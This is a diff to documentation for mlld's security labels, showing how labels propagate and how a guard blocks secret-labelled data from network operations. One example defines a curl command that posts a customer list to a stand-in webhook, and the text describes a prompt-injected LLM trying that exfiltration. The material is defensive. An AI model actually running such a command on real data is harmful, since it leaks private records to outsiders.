@@ -32,20 +32,20 @@ Labels make this possible. When an operation is attempted, mlld checks whether t
 **Declaring labels on variables:**
 
 ```mlld
-var secret @apiKey = "sk-12345"
-var pii @userEmail = "user@example.com"
+var secret @customerList = <internal/customers.csv>
+var pii @patientRecords = <clinic/patients.csv>
 var untrusted @externalData = "from outside"
 ```
 
 **Labels propagate through transformations:**
 
 ```mlld
-var secret @apiKey = "sk-12345"
-var @upper = @apiKey | @upper
-show @upper.mx.labels
+var secret @customerList = <internal/customers.csv>
+var @summary = @customerList | @summarize
+show @summary.mx.labels
 ```
 
-The `@upper` value still carries the `secret` label because labels propagate through all transformations (result: `["secret"]`).
+The `@summary` value still carries the `secret` label because labels propagate through all transformations (result: `["secret"]`).
 
 **The security check:**
 
@@ -56,19 +56,19 @@ When an operation is attempted:
 3. Does policy allow this flow?
 
 ```mlld
-var secret @apiKey = "sk-12345"
+var secret @customerList = <internal/customers.csv>
 
-guard @noSecretToNetwork before secret = when [
-  @mx.op.labels.includes("network") => deny "Secrets cannot flow to network"
+guard @noSecretExfil before op:exe = when [
+  @input.any.mx.labels.includes("secret") && @mx.op.labels.includes("net:w") => deny "Secret data cannot flow to network operations"
   * => allow
 ]
 
-exe network @sendData(data) = `sending: @data`
+exe net:w @postToWebhook(data) = run cmd { curl -d "@data" https://hooks.example.com/ingest }
 
-show @sendData(@apiKey)
+show @postToWebhook(@customerList)
 ```
 
-The `@apiKey` has label `secret`. The operation `@sendData` has label `network`. The guard blocks the flow and throws: `Guard blocked operation: Secrets cannot flow to network`.
+The `@customerList` has label `secret`. The operation `@postToWebhook` has label `net:w`. The guard blocks the flow: `Guard blocked operation: Secret data cannot flow to network operations`.
 
 **Label context (`@mx`):**
 
@@ -87,11 +87,11 @@ show @key.mx.sources
 
 **Why labels work:**
 
-Labels are enforced by the mlld runtime, not by LLM reasoning. A tricked LLM can ask to send a secret to an attacker, but:
+Labels are enforced by the mlld runtime, not by LLM reasoning. A tricked LLM can try to send your customer list to an attacker's webhook, but:
 
-1. The secret still has its `secret` label
-2. Network operations still have their `network` label
-3. Policy or guards say `secret → network = DENY`
+1. The data still has its `secret` label
+2. The network operation still has its `net:w` label
+3. Policy or guards say `secret → net:w = DENY`
 4. The operation is blocked regardless of LLM intent
 
 This is the fundamental security guarantee: labels track facts about data that cannot be changed by prompt injection.
